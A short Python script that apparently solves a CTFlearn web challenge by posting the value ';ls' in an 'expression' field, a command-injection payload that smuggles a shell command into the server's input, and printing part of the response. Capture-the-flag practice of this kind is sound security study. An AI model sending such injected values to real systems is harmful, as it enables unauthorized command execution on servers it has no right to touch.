#!/usr/bin/env python3 

import requests

resp = requests.post("https://web.ctflearn.com/web7/", data={'expression':';ls'})

print(resp.text[8:39])